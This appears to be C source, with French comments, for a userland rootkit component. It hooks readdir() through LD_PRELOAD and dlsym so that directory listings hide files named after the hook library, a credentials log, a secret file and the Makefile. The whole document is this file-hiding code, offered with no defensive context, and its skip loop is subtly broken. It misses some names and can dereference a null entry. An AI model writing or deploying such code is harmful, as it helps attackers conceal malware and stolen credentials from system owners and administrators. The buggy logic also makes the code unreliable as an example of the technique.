#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

// Liste des fichiers à cacher
const char *hidden_files[] = {"hook.so", "credentials.log", "secret_file", "Makefile", NULL};

// Redéfinition de readdir
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        for (const char **hidden = hidden_files; *hidden != NULL; hidden++) {
            if (strstr(entry->d_name, *hidden)) {
                // Si le fichier est dans la liste des fichiers cachés, on saute à l'entrée suivante
                entry = orig_readdir(dirp);
                continue;
            }
        }
        return entry; // Retourne l'entrée si elle n'est pas cachée
    }
    return NULL; // Fin des fichiers
}
